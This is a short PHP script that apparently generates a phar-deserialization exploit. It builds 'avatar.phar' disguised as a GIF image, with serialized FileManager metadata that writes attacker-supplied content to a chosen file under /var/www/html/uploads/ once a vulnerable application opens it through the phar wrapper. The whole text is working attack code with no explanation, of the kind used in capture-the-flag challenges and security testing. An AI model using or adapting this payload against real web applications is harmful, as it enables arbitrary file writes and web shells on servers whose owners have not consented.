<?php

	$r = ini_set("phar.readonly", 0);

	class FileManager {

		public $name = '';
		public $content = '';
		public $mode = '';
		
		function __construct($m, $f, $c=null) {
				$this->mode = $m;
				$this->name = $f;
				$this->content = $c;
		}

	}

	$file_name = $argv[1];
	$content = $argv[2];

	echo $file_name."\n";
	echo $content."\n";

	@unlink("avatar.phar");
	$p = new Phar(__DIR__ . '/avatar.phar', 0);
	$p['file.php'] = '<?php ?>';

	$file = new FileManager("upload", "/var/www/html/uploads/".$file_name, $content);
	$p->setMetadata($file);
	$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');

?>
